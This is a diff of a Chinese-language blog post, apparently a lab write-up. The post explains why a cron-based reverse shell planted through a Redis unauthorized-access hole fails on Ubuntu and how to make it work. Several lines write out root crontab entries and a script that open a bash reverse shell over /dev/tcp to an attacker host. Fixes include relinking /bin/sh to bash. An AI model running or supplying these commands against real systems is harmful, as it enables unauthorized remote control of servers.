@@ -376,63 +376,63 @@
 <p>kali2.0：192.168.0.106，用来接收ubuntu反弹过来的shell</p>
 <h3 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h3><p>事情源自于我利用redis未授权访问漏洞在向</p>
 <p>ubuntu的</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/var/</span>spool<span class="regexp">/cron/</span>crontabs</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/crontabs</span><br></pre></td></tr></table></figure>
 <p>目录下创建任务计划文件去反弹shell时，发现shell并不能反弹到自己的kali上</p>
 <p>任务计划文件</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/var/</span>spool<span class="regexp">/cron/</span>crontabs<span class="regexp">/root</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
 <p>内容如下</p>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span><span class="number">.0</span><span class="number">.106</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 <p>需要特别注意的一点是这的root文件的权限必须为600，也就是</p>
-<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rw<span class="comment">-------</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rw-------</span><br></pre></td></tr></table></figure>
 <p>，否则会出现</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">cron</span><span class="selector-attr">[53948]</span>: (root) <span class="selector-tag">INSECURE</span> <span class="selector-tag">MODE</span> (mode <span class="number">0600</span> expected)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cron[53948]: (root) INSECURE MODE (mode 0600 expected)</span><br></pre></td></tr></table></figure>
 <p>的错误，会影响到后面的实验 </p>
 <p>但是kali却迟迟接收不到反弹过来的shell</p>
 <p>之前在centos上利用的时候并没有出现这种情况，使用ubuntu的时候居然不行，下面我们就来一步步的排查看看到底是什么原因导致的</p>
 <p>首先，咱们先来看一下系统日志</p>
-<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f /<span class="built_in">var</span>/<span class="built_in">log</span>/syslog</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f /var/log/syslog</span><br></pre></td></tr></table></figure>
 <p>通过系统日志可以看到</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">CRON</span><span class="selector-attr">[55318]</span>: (CRON) <span class="selector-tag">info</span> (No MTA installed, discarding output)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CRON[55318]: (CRON) info (No MTA installed, discarding output)</span><br></pre></td></tr></table></figure>
 <p>这一条，我们之所以反弹shell失败，和这句话有着很大的关系，百度了一番后得到这句话的大概意思就是我们任务计划里的命令执行如果出现了错误，ubuntu会将这些错误信息去输出到ubuntu系统的邮件服务器，但是由于ubuntu系统默认没有安装邮件服务器，所以才导致了上面的错误</p>
 <p>通过了上面的信息，可以推断出我们任务计划中的命令执行出现了某种错误，然后ubuntu处理这种错误方式是将错误信息发送到本地的邮件服务器，但是邮件服务器不存在，那么我们要想办法将错误信息重定向到文件里面去看看究竟是命令的什么地方产生了错误，修改任务计划文件为</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * '/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1'&gt;/tmp/error.txt 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
 <p>1代表标准输出。2代表标准错误输出，也就是命令执行出现的错误，这里将</p>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span><span class="number">.0</span><span class="number">.106</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 <p>执行的标准错误输出重定向到输出流，也就是</p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/<span class="keyword">error</span>.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/error.txt</span><br></pre></td></tr></table></figure>
 <p>这个文件中，而不是邮件服务器，然后再看日志就没有刚刚的错误了</p>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/bin/</span><span class="string">sh:</span> <span class="number">1</span>: <span class="regexp">/bin/</span>bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/192.168.0.106/</span><span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>: not found</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh: 1: /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1: not found</span><br></pre></td></tr></table></figure>
 <p>下面可以看到tmp目录下新生成了一个记录错误信息的文件error.txt,内容如下</p>
 <p>这条错误的意思说/bin/bash没有被找到，通过错误信息还可以明白一件事情，那就是linux里面的cron中command执行的shell环境是/bin/sh，那我们可以再来看一下ubuntu下的/bin/sh文件究极是一个怎么样的文件</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> -<span class="keyword">al</span> /bin/<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /bin/sh</span><br></pre></td></tr></table></figure>
 <p>可以看到/bin/sh其实是一个软连接文件(l),类似于windows中的快捷方式，只不过在ubuntu中/bin/sh这个软连接指向了dash，而我们反弹shell使用的shell环境是dash，所以这一点是反弹出错的根本原因</p>
 <p>那么之前的centos为什么就能成功，下面来看一下centos/bin/sh的指向</p>
 <p>可以看到centos中</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/bin/</span>sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh</span><br></pre></td></tr></table></figure>
 <p>的指向是bash，所以命令执行不会出错</p>
 <p>搞清楚了根本的原因后，来说一下解决的办法，这里有两种解决办法，其中一种解决办法是通过修改ubuntu中</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/bin/</span>sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh</span><br></pre></td></tr></table></figure>
 <p>的指向，将dash改为bash即可，命令如下</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ln</span> -s -<span class="keyword">f</span> bash /bin/<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s -f bash /bin/sh</span><br></pre></td></tr></table></figure>
 <p>可以看到此时</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">ls</span> -<span class="keyword">al</span> /bin/<span class="keyword">sh</span></span><br><span class="line">lrwxrwxrwx <span class="number">1</span> root root <span class="number">4</span> Mar <span class="number">18</span> <span class="number">07</span>:<span class="number">18</span> /bin/<span class="keyword">sh</span> -&gt; bash</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al /bin/sh</span><br><span class="line">lrwxrwxrwx 1 root root 4 Mar 18 07:18 /bin/sh -&gt; bash</span><br></pre></td></tr></table></figure>
 <p>，此时将任务计划里的文件修改为之前反弹shell的命令，可以看到不会再报错了，并且shell成功反弹到了kali上</p>
 <p>下面来说一下第二种解决办法，首先我们先将</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/bin/</span>sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh</span><br></pre></td></tr></table></figure>
 <p>的指向改回</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dash</span><br><span class="line"><span class="keyword">ln</span> -s -<span class="keyword">f</span> dash /bin/<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dash</span><br><span class="line">ln -s -f dash /bin/sh</span><br></pre></td></tr></table></figure>
 <p>第二种方法，就是避免在cron文件里去使用bash这个shell，我们可以另外的去建一个反弹shell的shell脚本文件，然后在任务计划里面去直接调用这个shell脚本文件</p>
 <p>shell脚本文件如下，文件名为</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp/test.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.107/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp/test.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.107/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 <p>然后为test.sh加上执行权限</p>
-<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /tmp/<span class="keyword">test</span>.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /tmp/test.sh</span><br></pre></td></tr></table></figure>
 <p>之后任务计划里的内容修改为</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">* </span><span class="bullet">* *</span> <span class="bullet">* *</span> /tmp/test.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /tmp/test.sh</span><br></pre></td></tr></table></figure>
 <p>可以看到kali上成功反弹到了shell</p>
 <p>总结</p>
 <p>这一次真的是踩了很多坑，最终才终于弄明白，通过这次的学习使我对linux的认识更加的深刻了，同时也学到了解决问题的思路和方法，在这里十分感谢kakaxi和ttgo2两位大神的帮助！</p>
 <p>上面都是大佬的思路，下面补充一个师兄的方法：</p>
-<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/<span class="number">1</span> * * * *  <span class="keyword">bash </span>-c <span class="string">"bash -i  &gt;&amp;/dev/tcp/123.207.x.x/1234 0&gt;&amp;1"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * *  bash -c &quot;bash -i  &gt;&amp;/dev/tcp/123.207.x.x/1234 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
 <p>不用修改链接指向，直接在sh下执行bash -c。</p>
 
       
@@ -578,7 +578,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-count">28</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
